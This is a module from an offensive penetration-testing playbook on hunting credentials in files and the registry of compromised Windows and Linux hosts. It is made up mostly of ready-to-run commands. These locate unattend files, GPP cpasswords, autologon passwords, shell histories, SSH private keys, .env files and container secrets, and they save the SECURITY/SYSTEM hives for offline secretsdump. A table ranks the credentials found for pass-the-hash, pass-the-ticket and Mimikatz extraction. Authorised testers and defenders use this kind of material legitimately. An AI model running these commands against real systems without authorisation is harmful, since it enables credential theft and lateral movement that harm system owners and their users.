# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Credential Hunting — Files and Registry

## Contents

  - [Credential Hunting — Files and Registry](#credential-hunting-files-and-registry)


> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Credential Hunting — Files and Registry

Before touching LSASS or trying Kerberos attacks, look for credentials in plain sight.

#### Windows Files to Check

```cmd
# Unattend files (auto-install leftovers — can contain admin passwords in clear)
dir /s /b C:\Windows\Panther\Unattend*.xml
dir /s /b C:\Windows\Panther\Autounattend*.xml
dir /s /b C:\Windows\System32\Sysprep\Unattend*.xml

# Group Policy Preferences (AES-encrypted passwords — key is PUBLIC, MS14-025)
findstr /S cpassword C:\Windows\SYSVOL\*.xml
# Decrypt with: gpp-decrypt <cpassword_value>

# PowerShell history (may contain credentials typed into PS)
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Web.config / app.config (database connection strings with passwords)
dir /s /b C:\inetpub\wwwroot\web.config
dir /s /b C:\*.config | findstr "connectionString"

# Scripts in SYSVOL (sometimes contain hardcoded credentials)
dir /s \\<domain>\SYSVOL\*.vbs
dir /s \\<domain>\SYSVOL\*.ps1
dir /s \\<domain>\SYSVOL\*.bat

# Saved RDP connections (stored passwords)
dir /s /b %USERPROFILE%\AppData\Local\Microsoft\Remote Desktop Connection\*.rdp
cmdkey /list                              # stored credentials in Credential Manager

# Registry — autologon passwords (plaintext)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

# Registry — LSA secrets (may contain cached service account passwords)
reg save HKLM\SECURITY C:\temp\security.hiv
reg save HKLM\SYSTEM C:\temp\system.hiv
# Then offline: impacket-secretsdump -security security.hiv -system system.hiv LOCAL

# Registry — SNMP community strings (often default: public/private)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

# Registry — Putty sessions (may contain proxy credentials)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# McAfee/Symantec encrypted passwords (various tools can decrypt)
dir /s C:\ProgramData\McAfee\*.xml
```

#### Linux Files to Check on Internal Hosts

```bash
# SSH keys
find / -name id_rsa -o -name id_dsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
cat ~/.ssh/authorized_keys ~/.ssh/known_hosts

# History files
cat ~/.bash_history ~/.mysql_history ~/.psql_history ~/.python_history ~/.zsh_history ~/.redis_history

# Configuration files with passwords
grep -rn "password" /etc/ /opt/ /var/ --include="*.conf" --include="*.cfg" --include="*.ini" 2>/dev/null
grep -rn "connectionString\|DB_CONNECTION\|DATABASE_URL" /var/www/ /opt/ 2>/dev/null

# Environment files
cat .env .env.local .env.production 2>/dev/null
cat /etc/environment /etc/profile.d/*

# Crontab (may have credentials in command or script paths)
cat /etc/crontab; ls -la /etc/cron.*; crontab -l

# Git repos (may contain credentials in history)
find / -name ".git-credentials" 2>/dev/null
find / -name ".gitconfig" -exec cat {} \; 2>/dev/null

# Docker/container secrets
cat /run/secrets/* 2>/dev/null
docker inspect $(docker ps -q) 2>/dev/null | grep -i "pass\|secret\|key"

# Kerberos tickets (use if host is AD-joined)
ls -la /tmp/krb5* 2>/dev/null; klist 2>/dev/null
```

#### Credential Quality Assessment

Before launching a full credential-based attack, identify which credentials are likely to work:

| Evidence | Quality | Next Step |
|---|---|---|
| Cleartext password in config file | High | Try directly against other services (password reuse) |
| NetNTLMv2 hash | Medium | Try cracking offline; if uncracked, try relay |
| NTLM hash | High | PTH to any NTLM-authenticated service |
| AES Kerberos key | Very High | Pass-the-Key (Overpass-the-Hash) |
| Kerberos TGT | Very High | PTT to any service in domain |
| cpassword (GPP AES) | High | Always decryptable (key is public), use directly |
| RDP saved credential | Medium | Can extract with Mimikatz `dpapi::cred` |
| Browser saved password | Low-Medium | Requires DPAPI decryption with user's master key |

---


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
